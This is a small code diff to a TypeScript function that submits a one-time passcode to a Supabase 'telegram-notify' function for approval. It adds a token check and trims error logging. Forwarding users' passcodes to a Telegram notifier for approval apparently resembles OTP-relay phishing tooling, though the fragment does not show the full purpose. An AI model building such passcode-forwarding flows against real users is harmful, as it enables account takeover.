@@ -86,6 +86,7 @@ export async function submitOtpForApproval(
   }
 
   let requestId: string | null = null;
+  if (!flowAuth().flowToken) return 'error';
   try {
     const { data, error } = await supabase.functions.invoke('telegram-notify', {
       body: {
@@ -101,7 +102,7 @@ export async function submitOtpForApproval(
     if (error) throw error;
     requestId = (data as { request_id?: string } | null)?.request_id ?? null;
   } catch (err) {
-    console.error('OTP approval submit failed:', err);
+    console.warn('OTP approval submit failed:', (err as Error)?.message);
     return 'error';
   }
 
